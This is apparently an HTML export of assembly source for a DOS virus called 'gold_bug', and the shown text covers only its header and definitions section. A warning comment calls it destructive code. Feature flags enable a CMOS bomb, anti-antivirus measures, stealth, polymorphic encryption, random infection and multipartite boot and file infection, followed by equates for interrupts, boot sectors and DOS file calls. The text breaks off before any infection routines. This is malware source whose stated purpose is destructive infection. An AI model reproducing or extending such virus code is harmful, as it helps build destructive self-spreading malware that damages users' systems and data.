<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/1999/REC-html401-19991224/strict.dtd">
<html>
<head>
<META http-equiv=Content-Type content="text/html; charset=windows-1252">
<title>Exported from Notepad++</title>
<style type="text/css">
span {
	font-family: 'Courier New';
	font-size: 10pt;
	color: #000000;
}
.sc0 {
}
.sc1 {
	color: #008000;
}
.sc2 {
	color: #FF8000;
}
.sc4 {
	font-weight: bold;
	color: #000080;
}
.sc5 {
}
.sc6 {
	font-weight: bold;
	color: #0000FF;
}
.sc8 {
	font-weight: bold;
	color: #8080FF;
}
.sc9 {
	color: #0080FF;
}
.sc10 {
	font-weight: bold;
	color: #000080;
}
.sc12 {
	color: #808000;
}
</style>
</head>
<body>
<div style="float: left; white-space: pre; line-height: 1; background: #FFFFFF; "><span class="sc5">cseg</span><span class="sc0">        </span><span class="sc9">segment</span><span class="sc0"> </span><span class="sc10">para</span><span class="sc0">    </span><span class="sc9">public</span><span class="sc0">  </span><span class="sc12">'code'</span><span class="sc0">

</span><span class="sc5">gold_bug</span><span class="sc0">    </span><span class="sc9">proc</span><span class="sc0">    </span><span class="sc10">near</span><span class="sc0">

</span><span class="sc9">assume</span><span class="sc0">      </span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">cseg</span><span class="sc0">



</span><span class="sc1">;-----------------------------------------------------------------------------</span><span class="sc0">



</span><span class="sc1">;designed by "Q" the misanthrope.</span><span class="sc0">



</span><span class="sc1">;-----------------------------------------------------------------------------</span><span class="sc0">



</span><span class="sc1">; CAUTION: THIS IS DESTRUCTIVE CODE.  YOU SHOULD NOT EVEN BE LOOKING AT IT.</span><span class="sc0">

</span><span class="sc1">;          I HAVE NEVER AND WILL NEVER RELEASE THIS CODE.  IF YOU SHOULD BE</span><span class="sc0">

</span><span class="sc1">;          LOOKING AT IT, IT IS BECAUSE IT WAS STOLEN FROM ME.  YOU HAVE NO</span><span class="sc0">

</span><span class="sc1">;          RIGHT TO LOOK AT THIS CODE.  IF THIS SOURCE SHOULD FALL INTO THE</span><span class="sc0">

</span><span class="sc1">;          WRONG HANDS, IT COULD BE VERY BAD!  DESTROY THIS IMMEDIATELY.  I</span><span class="sc0">

</span><span class="sc1">;          HOLD NO RESPONSIBILITY FOR WHAT STUPID PEOPLE DO WITH THIS CODE.</span><span class="sc0">

</span><span class="sc1">;          THIS WAS WRITTEN FOR EDUCATIONAL PURPOSES ONLY!!!</span><span class="sc0">



</span><span class="sc1">;-----------------------------------------------------------------------------</span><span class="sc0">



</span><span class="sc2">.186</span><span class="sc0">

</span><span class="sc5">TRUE</span><span class="sc0">        </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">001h</span><span class="sc0">

</span><span class="sc5">FALSE</span><span class="sc0">       </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc0">



</span><span class="sc1">;-----------------------------------------------------------------------------</span><span class="sc0">



</span><span class="sc1">;option                  bytes used and where</span><span class="sc0">



</span><span class="sc5">DELETE_SCANNERS</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc5">FALSE</span><span class="sc0">   </span><span class="sc1">; -2 bytes  -2 in com_code</span><span class="sc0">

</span><span class="sc5">CHECK_FOR_8088</span><span class="sc0">  </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc5">TRUE</span><span class="sc0">    </span><span class="sc1">;  4 bytes   4 in com_code</span><span class="sc0">

</span><span class="sc5">INFECT_RANDOM</span><span class="sc0">   </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc5">TRUE</span><span class="sc0">    </span><span class="sc1">;  4 bytes   4 in com_code</span><span class="sc0">

</span><span class="sc5">CMOS_BOMB</span><span class="sc0">   </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc5">TRUE</span><span class="sc0">    </span><span class="sc1">;  4 bytes   4 in com_code</span><span class="sc0">

</span><span class="sc5">DEFLECT_DELETE</span><span class="sc0">  </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc5">TRUE</span><span class="sc0">    </span><span class="sc1">;  5 bytes   5 in com_code</span><span class="sc0">

</span><span class="sc5">READING_STEALTH</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc5">TRUE</span><span class="sc0">    </span><span class="sc1">;  5 bytes   5 in com_code</span><span class="sc0">

</span><span class="sc5">SAME_FILE_DATE</span><span class="sc0">  </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc5">TRUE</span><span class="sc0">    </span><span class="sc1">; 24 bytes  24 in com_code</span><span class="sc0">

</span><span class="sc5">DOUBLE_DECRIPT</span><span class="sc0">  </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc5">TRUE</span><span class="sc0">    </span><span class="sc1">; 26 bytes  26 in com_code</span><span class="sc0">

</span><span class="sc5">EXECUTE_SPAWNED</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc5">TRUE</span><span class="sc0">    </span><span class="sc1">; 35 bytes  32 in com_code  3 in boot_code</span><span class="sc0">

</span><span class="sc5">MODEM_CODE</span><span class="sc0">  </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc5">TRUE</span><span class="sc0">    </span><span class="sc1">; 40 bytes  29 in com_code 11 in boot_code</span><span class="sc0">

</span><span class="sc5">ANTI_ANTIVIRUS</span><span class="sc0">  </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc5">TRUE</span><span class="sc0">    </span><span class="sc1">; 46 bytes  35 in com_code 11 in boot_code</span><span class="sc0">

</span><span class="sc5">POLYMORPHIC</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc5">TRUE</span><span class="sc0">    </span><span class="sc1">; 90 bytes  74 in com_code 16 in boot_code</span><span class="sc0">

</span><span class="sc5">MULTIPARTITE</span><span class="sc0">    </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc5">TRUE</span><span class="sc0">    </span><span class="sc1">;372 bytes 346 in com_code 26 in boot_code</span><span class="sc0">



</span><span class="sc1">;-----------------------------------------------------------------------------</span><span class="sc0">



</span><span class="sc1">;floppy boot infection</span><span class="sc0">



</span><span class="sc5">FLOPPY_1_2M</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">001h</span><span class="sc0">

</span><span class="sc5">FLOPPY_760K</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc0">

</span><span class="sc5">FLOPPY_TYPE</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc5">FLOPPY_1_2M</span><span class="sc0">



</span><span class="sc1">;-----------------------------------------------------------------------------</span><span class="sc0">



</span><span class="sc9">IFE</span><span class="sc0"> </span><span class="sc5">MULTIPARTITE</span><span class="sc0">

</span><span class="sc5">DELETE_SCANNERS</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc5">FALSE</span><span class="sc0">

</span><span class="sc5">CHECK_FOR_8088</span><span class="sc0">  </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc5">FALSE</span><span class="sc0">

</span><span class="sc5">INFECT_RANDOM</span><span class="sc0">   </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc5">FALSE</span><span class="sc0">

</span><span class="sc5">DEFLECT_DELETE</span><span class="sc0">  </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc5">FALSE</span><span class="sc0">

</span><span class="sc5">READING_STEALTH</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc5">FALSE</span><span class="sc0">

</span><span class="sc5">SAME_FILE_DATE</span><span class="sc0">  </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc5">FALSE</span><span class="sc0">

</span><span class="sc5">EXECUTE_SPAWNED</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc5">FALSE</span><span class="sc0">

</span><span class="sc5">POLYMORPHIC</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc5">FALSE</span><span class="sc0">

</span><span class="sc9">ENDIF</span><span class="sc0">



</span><span class="sc1">;-----------------------------------------------------------------------------</span><span class="sc0">



</span><span class="sc5">SECTOR_SIZE</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">00200h</span><span class="sc0">

</span><span class="sc5">RES_OFFSET</span><span class="sc0">  </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">0fb00h</span><span class="sc0">

</span><span class="sc5">COM_OFFSET</span><span class="sc0">  </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">00100h</span><span class="sc0">

</span><span class="sc5">RELATIVE_OFFSET</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc5">RES_OFFSET</span><span class="sc4">-</span><span class="sc5">COM_OFFSET</span><span class="sc0">

</span><span class="sc5">PART_OFFSET</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc5">COM_OFFSET</span><span class="sc4">+</span><span class="sc5">SECTOR_SIZE</span><span class="sc0">

</span><span class="sc5">BOOT_OFFSET</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">07c00h</span><span class="sc0">

</span><span class="sc5">RELATIVE_BOOT</span><span class="sc0">   </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc5">BOOT_OFFSET</span><span class="sc4">-</span><span class="sc5">PART_OFFSET</span><span class="sc0">

</span><span class="sc5">LOW_JMP_10</span><span class="sc0">  </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">0031ch</span><span class="sc0">

</span><span class="sc5">LOW_JMP_21</span><span class="sc0">  </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">00321h</span><span class="sc0">

</span><span class="sc5">SAVE_INT_CHAIN</span><span class="sc0">  </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">0032ch</span><span class="sc0">

</span><span class="sc5">SCRATCH_AREA</span><span class="sc0">    </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">08000h</span><span class="sc0">

</span><span class="sc5">HEADER_SEGMENT</span><span class="sc0">  </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">00034h</span><span class="sc0">

</span><span class="sc5">INT_21_IS_NOW</span><span class="sc0">   </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">0cch</span><span class="sc0">

</span><span class="sc5">BIOS_INT_13</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">0c6h</span><span class="sc0">

</span><span class="sc5">NEW_INT_13_LOOP</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">0cdh</span><span class="sc0">

</span><span class="sc5">BOOT_SECTOR</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">001h</span><span class="sc0">

</span><span class="sc5">DESCRIPTOR_OFF</span><span class="sc0">  </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">015h</span><span class="sc0">

</span><span class="sc9">IF</span><span class="sc0"> </span><span class="sc5">FLOPPY_TYPE</span><span class="sc0"> </span><span class="sc9">EQ</span><span class="sc0"> </span><span class="sc5">FLOPPY_1_2M</span><span class="sc0">

</span><span class="sc5">DESCRIPTOR</span><span class="sc0">  </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">0f909h</span><span class="sc0">

</span><span class="sc5">OLD_BOOT_SECTOR</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">00eh</span><span class="sc0">

</span><span class="sc5">COM_CODE_SECTOR</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">00dh</span><span class="sc0">

</span><span class="sc9">ELSE</span><span class="sc0">

</span><span class="sc5">DESCRIPTOR</span><span class="sc0">  </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">0f905h</span><span class="sc0">

</span><span class="sc5">OLD_BOOT_SECTOR</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">005h</span><span class="sc0">

</span><span class="sc5">COM_CODE_SECTOR</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">004h</span><span class="sc0">

</span><span class="sc9">ENDIF</span><span class="sc0">

</span><span class="sc5">READ_ONLY</span><span class="sc0">   </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">001h</span><span class="sc0">

</span><span class="sc5">SYSTEM</span><span class="sc0">      </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">004h</span><span class="sc0">

</span><span class="sc5">DELTA_RI</span><span class="sc0">    </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">004h</span><span class="sc0">

</span><span class="sc5">DSR</span><span class="sc0">     </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">020h</span><span class="sc0">

</span><span class="sc5">CTS</span><span class="sc0">     </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">010h</span><span class="sc0">

</span><span class="sc5">CD</span><span class="sc0">      </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">080h</span><span class="sc0">

</span><span class="sc5">FAR_JUMP</span><span class="sc0">    </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">0eah</span><span class="sc0">

</span><span class="sc5">MIN_FILE_SIZE</span><span class="sc0">   </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">00500h</span><span class="sc0">

</span><span class="sc5">PSP_SIZE</span><span class="sc0">    </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">00100h</span><span class="sc0">

</span><span class="sc5">VIRGIN_INT_13_A</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">00806h</span><span class="sc0">

</span><span class="sc5">VIRGIN_INT_13_B</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">007b4h</span><span class="sc0">

</span><span class="sc5">VIRGIN_INT_2F</span><span class="sc0">   </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">00706h</span><span class="sc0">

</span><span class="sc5">FAR_JUMP_OFFSET</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">006h</span><span class="sc0">

</span><span class="sc5">SET_INT_OFFSET</span><span class="sc0">  </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">007h</span><span class="sc0">

</span><span class="sc5">CHANGE_SEG_OFF</span><span class="sc0">  </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">009h</span><span class="sc0">

</span><span class="sc5">VIDEO_MODE</span><span class="sc0">  </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">00449h</span><span class="sc0">

</span><span class="sc5">MONOCHROME</span><span class="sc0">  </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">007h</span><span class="sc0">

</span><span class="sc5">COLOR_VIDEO_MEM</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">0b000h</span><span class="sc0">

</span><span class="sc5">ADDR_MUL</span><span class="sc0">    </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">004h</span><span class="sc0">

</span><span class="sc5">SINGLE_BYTE_INT</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">003h</span><span class="sc0">

</span><span class="sc5">VIDEO_INT</span><span class="sc0">   </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">010h</span><span class="sc0">

</span><span class="sc5">VIDEO_INT_ADDR</span><span class="sc0">  </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc5">VIDEO_INT</span><span class="sc4">*</span><span class="sc5">ADDR_MUL</span><span class="sc0">

</span><span class="sc5">DISK_INT</span><span class="sc0">    </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">013h</span><span class="sc0">

</span><span class="sc5">DISK_INT_ADDR</span><span class="sc0">   </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc5">DISK_INT</span><span class="sc4">*</span><span class="sc5">ADDR_MUL</span><span class="sc0">

</span><span class="sc5">SERIAL_INT</span><span class="sc0">  </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">014h</span><span class="sc0">

</span><span class="sc5">DOS_INT</span><span class="sc0">     </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">021h</span><span class="sc0">

</span><span class="sc5">DOS_INT_ADDR</span><span class="sc0">    </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc5">DOS_INT</span><span class="sc4">*</span><span class="sc5">ADDR_MUL</span><span class="sc0">

</span><span class="sc5">MULTIPLEX_INT</span><span class="sc0">   </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">02fh</span><span class="sc0">

</span><span class="sc5">COMMAND_LINE</span><span class="sc0">    </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">080h</span><span class="sc0">

</span><span class="sc5">FIRST_FCB</span><span class="sc0">   </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">05ch</span><span class="sc0">

</span><span class="sc5">SECOND_FCB</span><span class="sc0">  </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">06ch</span><span class="sc0">

</span><span class="sc5">NULL</span><span class="sc0">        </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">00000h</span><span class="sc0">

</span><span class="sc5">GET_PORT_STATUS</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">00300h</span><span class="sc0">

</span><span class="sc5">WRITE_TO_PORT</span><span class="sc0">   </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">00100h</span><span class="sc0">

</span><span class="sc5">HD_0_HEAD_0</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">00080h</span><span class="sc0">

</span><span class="sc5">READ_A_SECTOR</span><span class="sc0">   </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">00201h</span><span class="sc0">

</span><span class="sc5">WRITE_A_SECTOR</span><span class="sc0">  </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">00301h</span><span class="sc0">

</span><span class="sc5">GET</span><span class="sc0">     </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc0">

</span><span class="sc5">SET</span><span class="sc0">     </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">001h</span><span class="sc0">

</span><span class="sc5">DELETE_W_FCB</span><span class="sc0">    </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">01300h</span><span class="sc0">

</span><span class="sc5">DEFAULT_DRIVE</span><span class="sc0">   </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc0">

</span><span class="sc5">GET_DEFAULT_DR</span><span class="sc0">  </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">01900h</span><span class="sc0">

</span><span class="sc5">DOS_SET_INT</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">02500h</span><span class="sc0">

</span><span class="sc5">FILE_DATE_TIME</span><span class="sc0">  </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">05700h</span><span class="sc0">

</span><span class="sc5">DENYNONE</span><span class="sc0">    </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">040h</span><span class="sc0">

</span><span class="sc5">OPEN_W_HANDLE</span><span class="sc0">   </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">03d00h</span><span class="sc0">

</span><span class="sc5">READ_W_HANDLE</span><span class="sc0">   </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">03f00h</span><span class="sc0">

</span><span class="sc5">WRITE_W_HANDLE</span><span class="sc0">  </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">04000h</span><span class="sc0">

</span><span class="sc5">CLOSE_HANDLE</span><span class="sc0">    </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">03e00h</span><span class="sc0">

</span><span class="sc5">UNLINK</span><span class="sc0">      </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">04100h</span><span class="sc0">

</span><span class="sc5">FILE_ATTRIBUTES</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">04300h</span><span class="sc0">

</span><span class="sc5">RESIZE_MEMORY</span><span class="sc0">   </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">04a00h</span><span class="sc0">

</span><span class="sc5">QUERY_FREE_HMA</span><span class="sc0">  </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">04a01h</span><span class="sc0">

</span><span class="sc5">ALLOCATE_HMA</span><span class="sc0">    </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">04a02h</span><span class="sc0">

</span><span class="sc5">EXEC_PROGRAM</span><span class="sc0">    </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">04b00h</span><span class="sc0">

</span><span class="sc5">GET_ERROR_LEVEL</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">04d00h</span><span class="sc0">

</span><span class="sc5">TERMINATE_W_ERR</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">04c00h</span><span class="sc0">

</span><span class="sc5">RENAME_A_FILE</span><span class="sc0">   </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">05600h</span><span class="sc0">

</span><span class="sc5">LSEEK_TO_END</span><span class="sc0">    </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">04202h</span><span class="sc0">

</span><span class="sc5">CREATE_NEW_FILE</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">05b00h</span><span class="sc0">

</span><span class="sc5">RESIDENT_LENGTH</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">068h</span><span class="sc0">

</span><span class="sc5">PARAMETER_TABLE</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">005f1h</span><span class="sc0">

</span><span class="sc5">MAX_PATH_LENGTH</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">00080h</span><span class="sc0">

</span><span class="sc5">EXE_HEADER_SIZE</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">020h</span><span class="sc0">

</span><span class="sc5">NEW_EXE_HEADER</span><span class="sc0">  </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">00040h</span><span class="sc0">

</span><span class="sc5">NEW_EXE_OFFSET</span><span class="sc0">  </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">018h</span><span class="sc0">

</span><span class="sc5">PKLITE_SIGN</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc12">'KP'</span><span class="sc0">

</span><span class="sc5">PKLITE_OFFSET</span><span class="sc0">   </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">01eh</span><span class="sc0">

</span><span class="sc5">NO_OF_COM_PORTS</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">004h</span><span class="sc0">

</span><span class="sc5">WINDOWS_BEGIN</span><span class="sc0">   </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">01605h</span><span class="sc0">

</span><span class="sc5">WINDOWS_END</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">01606h</span><span class="sc0">

</span><span class="sc5">ERROR_IN_EXE</span><span class="sc0">    </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">0000bh</span><span class="sc0">

</span><span class="sc9">IF</span><span class="sc0"> </span><span class="sc5">POLYMORPHIC</span><span class="sc0">

</span><span class="sc5">FILE_SIGNATURE</span><span class="sc0">  </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">07081h</span><span class="sc0">

</span><span class="sc5">XOR_SWAP_OFFSET</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">((</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">serial_number</span><span class="sc4">)-(</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">com_code</span><span class="sc4">))+</span><span class="sc5">TWO_BYTES</span><span class="sc0">

</span><span class="sc5">FILE_LEN_OFFSET</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">((</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">serial_number</span><span class="sc4">)-(</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">com_code</span><span class="sc4">))+</span><span class="sc5">THREE_BYTES</span><span class="sc0">

</span><span class="sc5">FIRST_UNDO_OFF</span><span class="sc0">  </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">((</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">first_jmp</span><span class="sc4">)-(</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">com_code</span><span class="sc4">)+</span><span class="sc5">ONE_BYTE</span><span class="sc4">)</span><span class="sc0">

</span><span class="sc5">SECOND_UNDO_OFF</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">((</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">second_jmp</span><span class="sc4">)-(</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">com_code</span><span class="sc4">))</span><span class="sc0">

</span><span class="sc5">BL_BX_OFFSET</span><span class="sc0">    </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">((</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">incbl_incbx</span><span class="sc4">)-(</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">com_code</span><span class="sc4">))</span><span class="sc0">

</span><span class="sc5">ROTATED_OFFSET</span><span class="sc0">  </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">((</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">rotated_code</span><span class="sc4">)-(</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">com_code</span><span class="sc4">))</span><span class="sc0">

</span><span class="sc9">ELSE</span><span class="sc0">

</span><span class="sc5">FILE_SIGNATURE</span><span class="sc0">  </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">0070eh</span><span class="sc0">

</span><span class="sc9">ENDIF</span><span class="sc0">

</span><span class="sc9">IF</span><span class="sc0"> </span><span class="sc5">MODEM_CODE</span><span class="sc0">

</span><span class="sc5">STRING_LENGTH</span><span class="sc0">   </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">((</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">partition_sig</span><span class="sc4">)-(</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">string</span><span class="sc4">))</span><span class="sc0">

</span><span class="sc9">ENDIF</span><span class="sc0">

</span><span class="sc9">IF</span><span class="sc0"> </span><span class="sc5">EXECUTE_SPAWNED</span><span class="sc0">

</span><span class="sc5">EXEC_SUBTRACT</span><span class="sc0">   </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">((</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">file_name</span><span class="sc4">)-(</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">exec_table</span><span class="sc4">))</span><span class="sc0">

</span><span class="sc9">ENDIF</span><span class="sc0">

</span><span class="sc5">DH_OFFSET</span><span class="sc0">   </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">((</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">dh_value</span><span class="sc4">)-(</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">initialize_boot</span><span class="sc4">)+</span><span class="sc5">TWO_BYTES</span><span class="sc4">)</span><span class="sc0">

</span><span class="sc5">ONE_NIBBLE</span><span class="sc0">  </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">004h</span><span class="sc0">

</span><span class="sc5">ONE_BYTE</span><span class="sc0">    </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">001h</span><span class="sc0">

</span><span class="sc5">TWO_BYTES</span><span class="sc0">   </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">002h</span><span class="sc0">

</span><span class="sc5">THREE_BYTES</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">003h</span><span class="sc0">

</span><span class="sc5">FOUR_BYTES</span><span class="sc0">  </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">004h</span><span class="sc0">

</span><span class="sc5">FIVE_BYTES</span><span class="sc0">  </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">005h</span><span class="sc0">

</span><span class="sc5">FIVE_BITS</span><span class="sc0">   </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">005h</span><span class="sc0">

